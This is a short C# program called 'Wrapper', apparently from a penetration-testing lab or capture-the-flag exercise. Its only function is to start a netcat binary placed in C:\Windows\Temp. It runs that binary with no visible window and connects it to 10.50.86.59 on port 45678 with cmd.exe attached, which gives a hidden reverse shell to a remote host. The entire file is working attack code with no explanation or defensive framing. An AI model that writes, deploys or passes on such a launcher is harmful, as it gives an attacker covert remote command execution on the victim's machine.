using System;
using System.Diagnostics;

namespace Wrapper{
    class Program{
        static void Main(){
            Process proc = new Process();
	    ProcessStartInfo procInfo = new ProcessStartInfo("C:\\Windows\\Temp\\nc-newBie.exe", "10.50.86.59 45678 -e cmd.exe");
            procInfo.CreateNoWindow = true;
	    proc.StartInfo = procInfo;
	    proc.Start();
	}
    }
}